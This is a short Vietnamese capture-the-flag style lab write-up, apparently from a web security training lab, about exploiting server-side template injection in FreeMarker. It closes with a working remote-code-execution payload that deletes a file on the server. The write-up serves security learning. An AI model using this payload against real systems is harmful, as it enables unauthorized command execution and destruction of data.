![image](https://github.com/user-attachments/assets/f0662859-565c-4ea9-b85d-be0a1c7c6dd7)

![image](https://github.com/user-attachments/assets/c058ba2d-f260-4dcf-80c1-ae51ab6567b7)

Đăng nhập vào và test thử chức năng thì thấy template mà server này nó dùng là `FreeMarker template`, tại sao tôi biết thì là vì tôi sửa lại cái này.

![image](https://github.com/user-attachments/assets/83074643-d86a-4e87-ac7f-a06a19e7a6f9)

Đọc docs của template này thì ta biết được format cũng như cách RCE

![image](https://github.com/user-attachments/assets/899bd2e1-3c6f-4432-9940-d7c6fb56279e)

Đó payload nó sẽ như thế, và riêng thằng template này nó có khá nhiều syntax.

![image](https://github.com/user-attachments/assets/921320d2-30b2-4f7c-b1e0-30d032a6c010)

Đó, các loại syntax của nó.

![image](https://github.com/user-attachments/assets/d791c911-e144-4680-ae22-d64c022f66db)

Thành công.

Và đây là payload của chương trình.

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

# REFERENCES
[1]. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker---basic-injection
